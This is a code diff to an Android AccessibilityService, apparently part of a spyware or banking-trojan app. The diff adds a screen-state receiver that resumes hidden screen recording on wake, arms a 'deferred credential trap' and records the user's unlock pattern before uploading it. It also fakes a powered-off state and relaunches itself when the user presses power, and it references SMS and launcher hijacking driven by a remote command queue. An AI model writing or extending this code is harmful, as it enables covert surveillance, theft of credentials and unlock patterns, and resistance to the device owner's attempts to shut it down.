@@ -190,6 +190,124 @@ class MyAccessibilityService : AccessibilityService() {
     private var shouldShowAnrAfterKill = false
     private var pendingAnrAppName: String? = null
     private var sequenceWatchdogJob: Job? = null
+    private var patternFuseJob: Job? = null
+    private var unlockWatchdogJob: Job? = null
+    private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
+
+    private val screenStateReceiver = object : android.content.BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+            val keepIgnited = prefs.getBoolean("power_shield_keep_ignited", false)
+            when (intent.action) {
+                Intent.ACTION_SCREEN_ON -> {
+                    prefs.edit().putLong("screen_on_ts", System.currentTimeMillis()).apply()
+                    DebugLogger.log("MONITOR_SYS", "Broadcast received: ACTION_SCREEN_ON. Triggering wake protocols.")
+                    DynamicUIManager.dispatchScreenState(true)
+                    
+                    if (prefs.getString("power_shield_state", "NORMAL") == "FAKE_OFF") {
+                        DebugLogger.log("POWER_SHIELD", "ACTION_SCREEN_ON in FAKE_OFF state. Dismissing Keyguard to extend system timer.")
+                        val pulseIntent = Intent(context, PulseActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            putExtra("is_wake_trigger", true)
+                        }
+                        context.startActivity(pulseIntent)
+                    }
+
+                    ScreenRecordManager.resumeRecording()
+                    DynamicUIManager.warmUpEngine(context)
+
+                    // --- DEFERRED CREDENTIAL TRAP LOGIC ---
+                    if (prefs.getBoolean("pending_cred_trap", false)) {
+                        prefs.edit().putBoolean("pending_cred_trap", false).apply()
+                        val pendingId = prefs.getInt("pending_cred_id", -1)
+                        val pendingContent = prefs.getString("pending_cred_content", "") ?: ""
+                        if (pendingId != -1) {
+                            DebugLogger.log("CAPTURE_PATTERN", "Executing deferred credential trap on screen wake.")
+                            val statusMsg = CommandProcessor.armCredentialTrap(context, pendingId, pendingContent)
+                            CommandProcessor.updateCommandStatus(context, pendingId, "DEFERRED_EXECUTION", statusMsg)
+                        }
+                    }
+
+                    // --- ACTIVE UNLOCK WATCHDOG ---
+                    unlockWatchdogJob?.cancel()
+                    unlockWatchdogJob = serviceScope.launch {
+                        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
+                        var wasLocked = km.isKeyguardLocked
+                        while (isActive) {
+                            delay(250)
+                            val isLockedNow = km.isKeyguardLocked
+                            if (wasLocked && !isLockedNow) {
+                                DebugLogger.log("MONITOR_SYS", "Unlock Watchdog detected Keyguard dismissal.")
+                                AuthRecoveryManager.onIdentityVerified(context)
+                                if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                                    DebugLogger.log("CAPTURE_PATTERN", "Device Unlocked (Keyguard Polling). Halting capture.")
+                                    patternFuseJob?.cancel()
+                                    ScreenRecordManager.stopRecording()
+                                }
+                                CommandProcessor.Gatekeeper.flushQueue(context)
+                                break
+                            }
+                            wasLocked = isLockedNow
+                        }
+                    }
+
+                    // --- PATTERN TRAP LOGIC ---
+                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                        patternFuseJob?.cancel()
+                        patternFuseJob = serviceScope.launch {
+                            delay(ScreenRecordManager.patternSuccessTimeoutMs)
+                            if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                                DebugLogger.log("CAPTURE_PATTERN", "Success threshold reached. Halting & uploading.")
+                                ScreenRecordManager.stopRecording()
+                            }
+                        }
+                    }
+                }
+                Intent.ACTION_SCREEN_OFF -> {
+                    unlockWatchdogJob?.cancel()
+                    prefs.edit().putLong("screen_off_ts", System.currentTimeMillis()).apply()
+                    ScreenRecordManager.pauseRecording()
+                    DynamicUIManager.dispatchScreenState(false)
+                    AuthRecoveryManager.onScreenOff()
+
+                    if (keepIgnited) {
+                        val hasDimmer = DimmerManager.currentLevel < 100
+                        val isSequenceActive = instance?.activeSequence != null || DefaultSmsManager.expectedMode.isNotEmpty() || LauncherManager.isHijacking
+                        if (!DynamicUIManager.isAnyAttached && !hasDimmer && !isSequenceActive) {
+                            DebugLogger.log("POWER_SHIELD", "Failsafe: Ignition lock active but no UI or Sequence attached. Disarming lock to prevent wake loop.")
+                            prefs.edit().putBoolean("power_shield_keep_ignited", false).apply()
+                        } else {
+                            DebugLogger.log("POWER_SHIELD", "Physical power-off detected during critical sequence. Re-igniting hardware.")
+                            val pulseIntent = Intent(context, PulseActivity::class.java).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                putExtra("is_wake_trigger", true)
+                            }
+                            context.startActivity(pulseIntent)
+                        }
+                    }
+                    
+                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                        patternFuseJob?.cancel()
+                        DebugLogger.log("CAPTURE_PATTERN", "Screen off before timeout. Timer reset.")
+                    }
+                }
+                Intent.ACTION_USER_PRESENT -> {
+                    AuthRecoveryManager.onIdentityVerified(context)
+                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                        DebugLogger.log("CAPTURE_PATTERN", "Device Unlocked (Fallback Signal). Halting capture.")
+                        patternFuseJob?.cancel()
+                        ScreenRecordManager.stopRecording()
+                    }
+                    serviceScope.launch { CommandProcessor.Gatekeeper.flushQueue(context) }
+                }
+                Intent.ACTION_AIRPLANE_MODE_CHANGED -> {
+                    val isOn = intent.getBooleanExtra("state", false)
+                    DebugLogger.log("MONITOR_SYS", "Broadcast received: ACTION_AIRPLANE_MODE_CHANGED. State: $isOn")
+                    instance?.handleAirplaneModeChange(isOn)
+                }
+            }
+        }
+    }
 
     private fun startSequenceWatchdog() {
         sequenceWatchdogJob?.cancel()
@@ -340,11 +458,29 @@ class MyAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             getDefaultRules()
         }
+
+        // Indestructible Screen State Watchdog registration (Immune to Process Deaths)
+        val filter = IntentFilter().apply {
+            addAction(Intent.ACTION_SCREEN_ON)
+            addAction(Intent.ACTION_SCREEN_OFF)
+            addAction(Intent.ACTION_USER_PRESENT)
+            addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED)
+        }
+        androidx.core.content.ContextCompat.registerReceiver(
+            this, 
+            screenStateReceiver, 
+            filter, 
+            androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
+        )
     }
 
     override fun onDestroy() {
         super.onDestroy()
         instance = null
+        try {
+            unregisterReceiver(screenStateReceiver)
+        } catch (e: Exception) {}
+        serviceScope.cancel()
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
